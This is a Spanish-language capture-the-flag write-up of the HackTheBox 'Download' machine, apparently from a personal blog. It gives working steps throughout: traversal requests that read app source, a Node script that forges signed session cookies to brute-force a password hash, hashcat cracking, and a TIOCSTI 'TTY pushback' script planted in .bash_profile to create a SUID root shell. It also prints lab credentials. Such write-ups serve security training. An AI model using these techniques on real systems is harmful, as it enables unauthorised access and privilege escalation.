@@ -1,0 +1,543 @@
+---
+logo: '/assets/writeups/download/logo.png'
+title: 'Máquina Download'
+description: 'Resolución de la máquina Download de HackTheBox'
+categories: ['HackTheBox', 'Hard', 'Linux']
+tags: ['Arbitrary File Read', 'express-session', 'Code Analysis', 'PrismaJS', 'PostgreSQL', 'tiocsti']
+---
+
+Nos toparemos con un sitio de almacenamiento de archivos con una vulnerabilidad AFR un poco complicada de identificar que nos permitirá obtener el secret del servidor para crear sesiones arbitrarias; nos aprovecharemos de este hecho para hacer fuerza bruta y obtener la contraseña de uno de los usuarios registrados. Escalaremos privilegios abusando del PostgreSQL y una tarea cron que ejecuta root para iniciar sesión como el usuario del servidor Postgres y automatizar unas tareas.
+
+## Reconocimento
+
+La máquina tiene 2 puertos abiertos unicamente.
+
+```bash
+# Nmap 7.94 scan initiated Sat Aug  5 15:01:49 2023 as: nmap -sS -Pn -n -p- --open -oN ports --min-rate 300 -vvv 10.10.11.226
+Nmap scan report for 10.10.11.226
+Host is up, received user-set (0.17s latency).
+Scanned at 2023-08-05 15:01:49 -04 for 153s
+Not shown: 63304 closed tcp ports (reset), 2229 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+# Nmap done at Sat Aug  5 15:04:22 2023 -- 1 IP address (1 host up) scanned in 153.69 seconds
+```
+
+El sitio web permite registrarnos, subir y descargar nuestros archivos... pero fuera de eso no hay nada más interesante
+
+![Web](/assets/writeups/download/1.png)
+
+## Intrusión
+
+La parte de descargas de la web ciertamente, tiene un comportamiento un poco extraño al introducir una secuencia de retroceso de directorios: nos devuelve el portal, sin embargo esto suele ser así muchas veces
+
+```bash
+❯ curl -v --path-as-is "http://download.htb/files/download/9c163f37-bfec-480e-9aea-143d3cd345db/.%2e%2f"
+*   Trying 10.10.11.226:80...
+* Connected to download.htb (10.10.11.226) port 80
+> GET /files/download/9c163f37-bfec-480e-9aea-143d3cd345db/.%2e%2f HTTP/1.1
+> Host: download.htb
+> User-Agent: curl/8.3.0
+> Accept: */*
+> 
+< HTTP/1.1 200 OK
+< Server: nginx/1.18.0 (Ubuntu)
+< Date: Sat, 11 Nov 2023 00:34:32 GMT
+< Content-Type: text/html; charset=utf-8
+< Content-Length: 2066
+< Connection: keep-alive
+< X-Powered-By: Express
+< ETag: W/"812-Ow72EOa7gkUMth+ABDvlPDNVEb4"
+< Set-Cookie: download_session=eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfX0=; path=/; expires=Sat, 18 Nov 2023 00:34:32 GMT; httponly
+< Set-Cookie: download_session.sig=4kbZR1kOcZNccDLxiSi7Eblym1E; path=/; expires=Sat, 18 Nov 2023 00:34:32 GMT; httponly
+< 
+<!DOCTYPE html>
+... [snip]
+```
+
+En cualquier otra parte del sitio no pasa nada, parece que este sitio está bien protegido, sin embargo podemos pensar e intentar algo a ciegas: si cualquier fichero inexistente que intentemos descargar solamente nos devolverá un 404 o el portal si intentamos retroceder directorios, **se puede asumir que esta vulnerabilidad si existe solo que no tenemos algo nos lo diga**, pero para confirmarlo necesitamos apuntar a un archivo que sabemos, existe.
+
+No podemos ir muy atrás para apuntar al `/etc/passwd` ya que el nginx nos lo impedirá y también debemos url-encodear los carácteres para que el Express los tome en cuenta, pero si los archivos se almacenaran en un directorio del sistema, podemos intentar apuntar a un archivo de la aplicación web, como esto es Express sabemos que algún `package.json` debe existir. Si retrocedemos dos directorios intentando buscar este archivo, lo encontraremos:
+
+```bash
+❯ curl --path-as-is "http://download.htb/files/download/9c163f37-bfec-480e-9aea-143d3cd345db%2f%2e%2e%2f%2e%2e%2fpackage.json"
+{
+  "name": "download.htb",
+  "version": "1.0.0",
+  "description": "",
+  "main": "app.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "dev": "nodemon --exec ts-node --files ./src/app.ts",
+    "build": "tsc"
+  },
+  "keywords": [],
+  "author": "wesley",
+  "license": "ISC",
+  "dependencies": {
+    "@prisma/client": "^4.13.0",
+    "cookie-parser": "^1.4.6",
+    "cookie-session": "^2.0.0",
+    "express": "^4.18.2",
+    "express-fileupload": "^1.4.0",
+    "zod": "^3.21.4"
+  },
+  "devDependencies": {
+    "@types/cookie-parser": "^1.4.3",
+    "@types/cookie-session": "^2.0.44",
+    "@types/express": "^4.17.17",
+    "@types/express-fileupload": "^1.4.1",
+    "@types/node": "^18.15.12",
+    "@types/nunjucks": "^3.2.2",
+    "nodemon": "^2.0.22",
+    "nunjucks": "^3.2.4",
+    "prisma": "^4.13.0",
+    "ts-node": "^10.9.1",
+    "typescript": "^5.0.4"
+  }
+}
+```
+
+y guiándonos por este archivo del proyecto npm, podemos intuitivamente obtener el archivo principal de la aplicación que aunque traspilado por ser TypeScript, nos da cosas que son de mucha utilidad
+
+```js
+"use strict";
+var __importDefault = (this && this.__importDefault) || function (mod) {
+    return (mod && mod.__esModule) ? mod : { "default": mod };
+};
+Object.defineProperty(exports, "__esModule", { value: true });
+const express_1 = __importDefault(require("express"));
+const nunjucks_1 = __importDefault(require("nunjucks"));
+const path_1 = __importDefault(require("path"));
+const cookie_parser_1 = __importDefault(require("cookie-parser"));
+const cookie_session_1 = __importDefault(require("cookie-session"));
+const flash_1 = __importDefault(require("./middleware/flash"));
+const auth_1 = __importDefault(require("./routers/auth"));
+const files_1 = __importDefault(require("./routers/files"));
+const home_1 = __importDefault(require("./routers/home"));
+const client_1 = require("@prisma/client");
+const app = (0, express_1.default)();
+const port = 3000;
+const client = new client_1.PrismaClient();
+const env = nunjucks_1.default.configure(path_1.default.join(__dirname, "views"), {
+    autoescape: true,
+    express: app,
+    noCache: true,
+});
+app.use((0, cookie_session_1.default)({
+    name: "download_session",
+    keys: ["8929874489719802418902487651347865819634518936754"],
+    maxAge: 7 * 24 * 60 * 60 * 1000,
+}));
+app.use(flash_1.default);
+app.use(express_1.default.urlencoded({ extended: false }));
+app.use((0, cookie_parser_1.default)());
+app.use("/static", express_1.default.static(path_1.default.join(__dirname, "static")));
+app.get("/", (req, res) => {
+    res.render("index.njk");
+});
+app.use("/files", files_1.default);
+app.use("/auth", auth_1.default);
+app.use("/home", home_1.default);
+app.use("*", (req, res) => {
+    res.render("error.njk", { statusCode: 404 });
+});
+app.listen(port, process.env.NODE_ENV === "production" ? "127.0.0.1" : "0.0.0.0", () => {
+    console.log("Listening on ", port);
+    if (process.env.NODE_ENV === "production") {
+        setTimeout(async () => {
+            await client.$executeRawUnsafe(`COPY (SELECT "User".username, sum("File".size) FROM "User" INNER JOIN "File" ON "File"."authorId" = "User"."id" GROUP BY "User".username) TO '/var/backups/fileusages.csv' WITH (FORMAT csv);`);
+        }, 300000);
+    }
+});
+```
+
+Tenemos el secret de las sesiones y los archivos de ruta del servidor.
+
+Buscando por vulnerabilidades en las rutas, encontramos algo curioso en el router de `/home`:
+
+```js
+❯ curl -s --path-as-is "http://download.htb/files/download/9c163f37-bfec-480e-9aea-143d3cd345db%2f%2e%2e%2f%2e%2e%2frouters%2fhome.js" | cat -l js
+"use strict";
+var __importDefault = (this && this.__importDefault) || function (mod) {
+    return (mod && mod.__esModule) ? mod : { "default": mod };
+};
+Object.defineProperty(exports, "__esModule", { value: true });
+const client_1 = require("@prisma/client");
+const express_1 = __importDefault(require("express"));
+const auth_1 = __importDefault(require("../middleware/auth"));
+const client = new client_1.PrismaClient();
+const router = express_1.default.Router();
+router.get("/", auth_1.default, async (req, res) => {
+    const files = await client.file.findMany({
+        where: { author: req.session.user },
+        select: {
+            id: true,
+            uploadedAt: true,
+            size: true,
+            name: true,
+            private: true,
+            authorId: true,
+            author: {
+                select: {
+                    username: true,
+                },
+            },
+        },
+    });
+    res.render("home.njk", { files });
+});
+exports.default = router;
+```
+
+Está tomando el valor de `session.user` para hacer una operación, la librería que utiliza es Prisma asi que busquemos más a fondo.
+
+> Prisma es una libreria ORM para node.js que funciona tanto con DBMS y File Databases, como MySQL, SQLite, PostgreSQL, MSSQL, etc.
+{: .prompt-info }
+
+La operación `where` que está haciendo prisma busca por objetos files que tengan un `author` que coincida con el de la sesión, en esta librería es posible concatenarle a la busqueda otras busquedas en las propiedades mediante operadores como `startsWith`, `equals` y `endsWith`, pero para saber por que cosas podemos filtrar, tenemos que conocer el modelo que se espera en `author`. Buscando por los docs de Prisma encontraremos que se almacenan en `PROJECT/node_modules/.prisma/client/schema.prisma` 
+
+```js
+// This is your Prisma schema file,
+// learn more about it in the docs: https://pris.ly/d/prisma-schema
+
+generator client {
+  provider = "prisma-client-js"
+}
+
+datasource db {
+  provider = "postgresql"
+  url      = env("DATABASE_URL")
+}
+
+model User {
+  id       Int    @id @default(autoincrement())
+  username String @unique
+  password String
+  files    File[]
+}
+
+model File {
+  id         String   @id @default(uuid())
+  name       String
+  size       Int
+  private    Boolean  @default(false)
+  uploadedAt DateTime @default(now())
+  author     User?    @relation(fields: [authorId], references: [id])
+  authorId   Int?
+}
+```
+{: filename="schema.prisma" }
+
+Si miramos el modelo `File`, veremos que el campo `author` corresponde al modelo `User`; al estar esperando todo el objeto de la sesión, podemos hacer un ataque de fuerza bruta booleano con el campo `password` utilizando `startsWith` para obtener la contraseña, viendo la ruta de registro veremos que están hasheadas en MD5 por lo que limitaremos el alfabeto a solo hexadecimal. Será algo rápido obtener el hash pero hay que programar esta lógica.
+
+El usuario al que le estaremos intentando sacar el hash de su contraseña será el que vimos en el `package.json`, wesley.
+
+```js
+const axios = require("axios");
+const Keygrip = require('keygrip');
+
+const chars = "abcdef1234567890";
+let grip = new Keygrip(["8929874489719802418902487651347865819634518936754"]);
+
+async function test(text){
+  let found = text;
+  let next = "";
+
+  for(char of chars){
+    let value = "download_session=" + Buffer.from(JSON.stringify({user:{username: {equals: 'WESLEY'}, password: {startsWith: found + char}}})).toString('base64');
+    let signature = "download_session.sig=" + grip.sign(value);
+    let request = await axios.get("http://download.htb/home/", {
+      headers: {
+        Cookie: `${value}; ${signature}`
+      }
+    });
+    if(request.data.length > 2174){
+        next = char;
+        break;
+    }
+  }
+  return next;
+}
+
+async function thing(){
+  let result = "";
+  while(true){
+    let next = await test(result);
+    if(next != ""){
+      process.stdout.write(next);
+      result += next;
+      continue
+    } else {
+      process.exit(0);
+    }
+  } 
+}
+
+thing();
+```
+{: filename="index.js"}
+
+> Para llegar a este código, fue necesario inspeccionar el código que express-session utilizaba para generar la signature y la correspondiente sesión e implementarlo en forma de un algoritmo para fuerza bruta.
+{: .prompt-info }
+
+Ejecutando este script, obtendremos el hash en unos minutos. El tiempo depende mayormente de la calidad de tu conexión a internet
+
+```bash
+❯ node index.js
+f88976c10af66915918945b9679b2bd3
+```
+
+Se crackea en poco tiempo
+
+```bash
+f88976c10af66915918945b9679b2bd3:dunkindonuts             
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 0 (MD5)
+Hash.Target......: f88976c10af66915918945b9679b2bd3
+Time.Started.....: Fri Nov 10 21:17:56 2023 (2 secs)
+Time.Estimated...: Fri Nov 10 21:17:58 2023 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  1128.1 kH/s (0.15ms) @ Accel:512 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 151552/14344384 (1.06%)
+Rejected.........: 0/151552 (0.00%)
+Restore.Point....: 149504/14344384 (1.04%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: geraldinne -> armas
+Hardware.Mon.#1..: Temp: 59c Util: 10%
+
+Started: Fri Nov 10 21:17:36 2023
+Stopped: Fri Nov 10 21:17:59 2023
+```
+
+La credencial es válida para entrar por SSH, y en el directorio del usuario encontraremos la primera flag
+
+```bash
+❯ /usr/bin/ssh wesley@download.htb
+wesley@download.htb password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-155-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat 11 Nov 2023 04:25:20 PM UTC
+
+  System load:           0.0
+  Usage of /:            58.9% of 5.81GB
+  Memory usage:          16%
+  Swap usage:            0%
+  Processes:             243
+  Users logged in:       2
+  IPv4 address for eth0: 10.10.11.226
+  IPv6 address for eth0: dead:beef::250:56ff:feb9:6f12
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Sat Nov 11 14:43:46 2023 from 10.10.14.156
+wesley@download:~$ ls
+user.txt
+wesley@download:~$ cat user.txt
+e2f23a45b28956f24b99cdafdf******
+```
+
+## Escalada de privilegios
+
+### root y postgres
+
+Hay un usuario autenticándose como root, cambiando de usuario a `postgres` y ejecutando comandos para administrar la base de datos
+
+```bash
+... [snip]
+2023/11/11 16:59:30 CMD: UID=0     PID=10861  | /usr/bin/python3 /usr/bin/landscape-sysinfo 
+2023/11/11 16:59:30 CMD: UID=0     PID=10854  | /bin/sh /etc/update-motd.d/50-landscape-sysinfo 
+2023/11/11 16:59:30 CMD: UID=0     PID=10848  | run-parts --lsbsysinit /etc/update-motd.d 
+2023/11/11 16:59:30 CMD: UID=0     PID=10847  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
+2023/11/11 16:59:30 CMD: UID=0     PID=10883  | cut -d  -f4 
+2023/11/11 16:59:30 CMD: UID=0     PID=10882  | /usr/bin/python3 -Es /usr/bin/lsb_release -sd 
+2023/11/11 16:59:30 CMD: UID=0     PID=10881  | /bin/sh /etc/update-motd.d/91-release-upgrade 
+2023/11/11 16:59:30 CMD: UID=0     PID=10880  | /bin/sh /etc/update-motd.d/91-release-upgrade 
+2023/11/11 16:59:30 CMD: UID=0     PID=10907  | /bin/sh /etc/update-motd.d/97-overlayroot 
+2023/11/11 16:59:30 CMD: UID=0     PID=10919  | -bash 
+2023/11/11 16:59:30 CMD: UID=113   PID=10940  | -bash 
+2023/11/11 16:59:30 CMD: UID=0     PID=10939  | su -l postgres 
+2023/11/11 16:59:30 CMD: UID=0     PID=10930  | /bin/bash -i ./manage-db
+... [snip]
+```
+
+El parámetro `-l` del comando `su` hace lo siguiente:
+
+> Start the shell as a login shell with an environment similar
+> to a real login:
+>
+>  •   clears all the environment variables except TERM and
+>      variables specified by --whitelist-environment
+>
+>  •   initializes the environment variables HOME, SHELL, USER,
+>      LOGNAME, and PATH
+>
+>  •   changes to the target user’s home directory
+>
+>  •   sets argv[0] of the shell to '-' in order to make the
+>      shell a login shell
+
+Una vulnerabilidad de la que podemos abusar acá es una conocida desde 1985 como "TTY Pushback"; al estar el comando de `su` de root y `bash` de postgres en la misma TTY podemos a través de la llamada de control TIOSCTI escribir carácteres en la cola de la TTY, y que estos se pongan en la terminal de root al matar el proceso de bash del usuario `postgres`.
+
+Sería algo así:
+
+![Diagram](/assets/writeups/download/2.png)
+
+Para esto, debemos poder cambiar un archivo que contega comandos al ejecutar apenas el usuario inicie sesión; viendo que `postgres` tiene de shell `/bin/bash` podemos utilizar el `.bashrc` y `.bash_profile`. Usemos el segundo.
+
+En los archivos de servicios de systemd encontraremos algo peculiar con un dato de mucha utilidad:
+
+```bash
+wesley@download:/etc/systemd/system$ cat download-site.service 
+[Unit]
+Description=Download.HTB Web Application
+After=network.target
+
+[Service]
+Type=simple
+User=www-data
+WorkingDirectory=/var/www/app/
+ExecStart=/usr/bin/node app.js
+Restart=on-failure
+Environment=NODE_ENV=production
+Environment=DATABASE_URL="postgresql://download:CoconutPineappleWatermelon@localhost:5432/download"
+
+[Install]
+WantedBy=multi-user.target
+```
+
+Al ingresar a PostgreSQL con esta contraseña y usuario, veremos que tenemos un permiso que nos facilita mucho más el asunto
+
+```bash
+wesley@download:/etc/systemd/system$ psql -U download -h localhost -W download
+Password: 
+psql (12.15 (Ubuntu 12.15-0ubuntu0.20.04.1))
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
+Type "help" for help.
+
+download=> \du
+                                          List of roles
+ Role name |                         Attributes                         |        Member of        
+-----------+------------------------------------------------------------+-------------------------
+ download  |                                                            | {pg_write_server_files}
+ postgres  | Superuser, Create role, Create DB, Replication, Bypass RLS | {}
+```
+
+Podemos escribir archivos; buscando por internet encontraremos un PoC en Python de TTY Pushback que podemos utilizar
+
+```python
+#!/usr/bin/python3
+import fcntl
+import termios
+import os
+import sys
+import signal
+
+os.kill(os.getppid(), signal.SIGSTOP)
+
+for char in "command-here" + '\n':
+    fcntl.ioctl(0, termios.TIOCSTI, char)
+
+```
+
+Vamos a meterlo en `/dev/shm`, y modificaremos el `.bash_profile` de `postgres` para que nos ejecute el script:
+
+```bash
+wesley@download:/dev/shm$ cat test.py
+#!/usr/bin/python3
+import fcntl
+import termios
+import os
+import sys
+import signal
+
+os.kill(os.getppid(), signal.SIGSTOP)
+
+for char in "cp /bin/bash /tmp/asd; chmod u+s /tmp/asd" + '\n':
+    fcntl.ioctl(0, termios.TIOCSTI, char)
+wesley@download:/dev/shm$ ls -la test.py
+-rwxrwxr-x 1 wesley wesley 228 Nov 11 17:16 test.py
+```
+
+```bash
+download=> copy (select '/dev/shm/test.py') to '/var/lib/postgresql/.bash_profile';
+COPY 1
+```
+
+Luego de un rato, root nos ejecutará el comando y nos dejará una bash SUID con la que podremos tomar la última flag.
+
+```bash
+wesley@download:/tmp$ ls -la asd
+-rwsr-xr-x 1 root root 1183448 Nov 11 17:25 asd
+wesley@download:/tmp$ ./asd -p
+asd-5.0# cd /root
+asd-5.0# ls
+manage-db  management.py  root.txt  venv
+asd-5.0# cat root.txt
+94dc2a821bcc079a398c763caa******
+```
+
+## Extra
+
+La máquina originalmente iba a ser de dificultad media, pero dada la complejidad de la explotación inicial decidieron ponerla como difícil.
+
+Si deseas el código utilizado para simular al usuario o tarea entrando como root y administrando la base de datos, aquí lo tienes:
+
+```py
+import paramiko
+import time
+import os
+
+while True:
+    print("Deleting files")
+
+    for file_name in os.listdir("/var/lib/postgresql/"):
+        if file_name != "12":
+            os.remove(os.path.join("/var/lib/postgresql/", file_name))
+
+    # This gives people 60 seconds to get their payload within .bashrc
+    time.sleep(60)
+
+    print("SSHing")
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    ssh.connect("localhost", username="root", password="QzN6j#aP#N6!7knrXkN!B$7kq")
+
+    chan = ssh.get_transport().open_session()
+    chan.get_pty()
+    chan.invoke_shell()
+    chan.send(b'/bin/bash -i ./manage-db\n')
+    time.sleep(5)
+    chan.send(b"psql\n")
+    time.sleep(30)
+
+    if not chan.closed:
+        chan.close()
+```
+
